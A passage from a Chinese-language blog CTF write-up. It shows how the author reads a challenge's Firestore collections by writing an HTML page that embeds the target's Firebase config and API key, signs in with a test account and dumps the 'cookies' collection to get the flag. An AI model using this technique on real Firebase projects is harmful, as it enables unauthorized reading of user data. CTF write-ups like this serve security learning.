<p>访问后会发现报错： Uncaught (in promise) FirebaseError: Missing or insufficient permissions. (ﾟ∀。)，还要权限？那么得从登录开始抓包了。发现登陆的时候有verifyPassword的URL，但是Key是加密的，这种情况下我们先不轻易解这个加密，回去翻文档，看有没有认证的选项。在<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/auth/web/start#sign_in_existing_users">这里</a>看到了登录的选项，那么添一段登录代码： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    firebase.auth().signInWithEmailAndPassword(<span class="string">&quot;tiaonmm@test.com&quot;</span>, <span class="string">&quot;tiaonmmn&quot;</span>).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Handle Errors here.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorCode = error.code;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorMessage = error.message;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;cookies&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>发现users我们没办法访问，但是cookies可以，不过我们的代码有问题，直接把对象toString()了，改一下。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    firebase.auth().signInWithEmailAndPassword(<span class="string">&quot;tiaonmm@test.com&quot;</span>, <span class="string">&quot;tiaonmmn&quot;</span>).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Handle Errors here.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorCode = error.code;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorMessage = error.message;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;cookies&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(doc.data());</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>浏览器访问后打开控制台即可看到flag。</p>

    <div id="aplayer-OUYuasyf" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="32317208" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{6f4bfe3a-9a40-4cf2-869e-3edd8f9e40d4}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">349k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">5:17</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  




  <script src="/js/local-search.js"></script>








<script>
document.querySelectorAll('.pdfobject-container').forEach(element => {
  const url = element.dataset.target;
  const pdfOpenParams = {
    navpanes : 0,
    toolbar  : 0,
    statusbar: 0,
    pagemode : 'thumbs',
    view     : 'FitH'
  };
  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;

  if (NexT.utils.supportsPDFs()) {
    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
  } else {
    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
  }
});
</script>


<script>
if (document.querySelectorAll('.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
    mermaid.init({
      theme    : 'forest',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    }, '.mermaid');
  }, window.mermaid);
}
</script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








  

  

  
<!-- calendar widget -->

    <script src=""></script>
    <script src=""></script>
    <script>
    $(function() {
        $('#CloudCalendar').aCalendar('zh-CN',
            $.extend(
                '', {
                    single:true,
                    root:'/calendar/'
                }
            )
        );
    });
    </script>

<script>
NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: "/",
    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
    ));
  }, window.Valine);
});
</script>

    
    <script src="/lib/calendar/calendar.min.js"></script>
    <script src="/lib/calendar/languages.min.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#CloudCalendar').aCalendar('zh-CN',
            $.extend(
                '', {
                    single:true,
                    root:'/calendar/'
                }
            )
        );
    });
    </script>

</body>
</html>


